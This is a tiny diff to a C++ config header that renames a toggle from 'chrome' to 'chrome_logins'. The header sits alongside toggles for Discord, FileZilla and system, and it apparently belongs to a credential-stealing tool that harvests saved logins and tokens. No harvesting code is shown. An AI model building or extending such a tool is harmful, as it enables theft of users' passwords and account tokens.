@@ -16,7 +16,7 @@ namespace config
 
 	//Configs to toggle different functionality
 	constexpr inline bool discord		= true;
-	constexpr inline bool chrome		= true;
+	constexpr inline bool chrome_logins	= true;
 	constexpr inline bool filezilla		= true;
 	constexpr inline bool system		= true;
 
